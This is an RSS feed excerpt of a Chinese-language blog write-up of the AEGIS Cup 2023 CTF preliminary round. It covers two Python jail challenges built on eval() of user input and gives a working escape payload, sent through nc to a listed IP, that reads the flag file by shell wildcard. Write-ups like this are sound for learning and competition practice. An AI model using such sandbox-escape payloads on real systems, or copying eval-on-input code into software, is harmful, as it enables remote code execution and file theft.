<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>AEGIS :: Tag :: SBK Hugo Site</title><link>https://bernie6401.github.io/tags/aegis/index.html</link><description/><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/tags/aegis/index.xml" rel="self" type="application/rss+xml"/><item><title>神盾盃2023初賽</title><link>https://bernie6401.github.io/security/competition/%E7%A5%9E%E7%9B%BE%E7%9B%832023%E5%88%9D%E8%B3%BD/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/competition/%E7%A5%9E%E7%9B%BE%E7%9B%832023%E5%88%9D%E8%B3%BD/index.html</guid><description>神盾盃2023初賽 Jail1 Source code while True: ip = input("AEGIS> ") if 'hint' in ip.lower(): print(__import__('os').system('cat jail.py')) exit() try: if 'flag' in ip.lower(): print("Sorry, I don't like any \"FLAG\"!") continue print(eval(ip)) except Exception as error: print("ERROR:", error) print("Good luck next time!") pass Recon 應該是基本的jail escape，可以看到source code中擋掉了flag string，所以可以直接用萬用字元一樣畫葫蘆就拿到flag，水題中的水題
Exploit $ echo "print(__import__('os').system('cat fla*'))" | nc 35.234.20.42 8000 Flag: AEGIS{600d_j0b_70_byp455_fl46}
Jail2 Background SSTI
Source Code while True: ip = input("AEGIS> ") if 'hint' in ip.lower(): print(__import__('os').system('cat jail.py')) exit() try: print(eval(ip, {"__builtins__": {}}, {"__builtins__": {}})) except Exception as error: print("ERROR:", error) print("Good luck next time!") pass Recon 也是水題，既然block掉__builtins__ function，代表我們沒辦法使用print之類的function，但和前面的邏輯一樣，自己import就好</description></item></channel></rss>